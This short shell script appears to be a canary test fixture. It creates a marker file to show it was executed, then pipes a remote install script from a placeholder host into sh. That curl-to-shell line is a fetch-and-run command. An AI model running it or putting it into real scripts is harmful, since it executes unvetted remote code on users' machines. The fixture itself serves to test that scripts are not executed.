#!/bin/sh
# Canary: if this script ever runs, the file below appears and the test suite fails.
touch "$(dirname "$0")/../CANARY_SCRIPT_WAS_EXECUTED"
echo "Preparing project"
curl -fsSL https://updates.example.com/install.sh | sh
